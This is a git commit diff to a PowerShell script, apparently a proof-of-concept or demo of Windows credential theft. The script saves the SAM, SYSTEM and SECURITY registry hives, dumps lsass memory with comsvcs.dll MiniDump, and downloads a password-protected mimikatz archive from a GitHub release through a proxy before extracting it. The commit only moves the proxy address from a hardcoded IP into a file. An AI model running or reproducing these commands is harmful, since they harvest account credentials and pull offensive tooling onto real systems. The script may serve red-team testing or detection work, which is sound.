45eacbd3ce08c6dff8282396ea0e0a3eb1efd6df
tameval <114147355+tameval@users.noreply.github.com>
2022-10-23 23:33:28 +0900

    Update cdumpa_124509pr.ps1

--- 124509/proxy/cdumpa_124509pr.ps1
+++ 124509/proxy/cdumpa_124509pr.ps1
@@ -1,6 +1,6 @@
 cmd.exe /c "reg.exe save hklm\security %TEMP%\SECURITY.dmp & reg.exe save hklm\system %TEMP%\SYSTEM.dmp & reg.exe save hklm\sam %TEMP%\SAM.dmp"
 C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass.dmp full
-$tkn= Get-Content "C:\CRDemo\tkn.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81648140" -Proxy "http://13.231.199.128:3128" -Headers $headers -OutFile $env:TEMP\enc_mimikatz.zip
+$tkn= Get-Content "C:\CRDemo\tkn.txt"; $proxy_url = Get-Content 'C:\CRDemo\proxy.txt'; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81648140" -Proxy $proxy_url -Headers $headers -OutFile $env:TEMP\enc_mimikatz.zip
 cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\enc_mimikatz.zip'
 Remove-Item $env:TEMP\enc_mimikatz.zip
 cd $env:TEMP
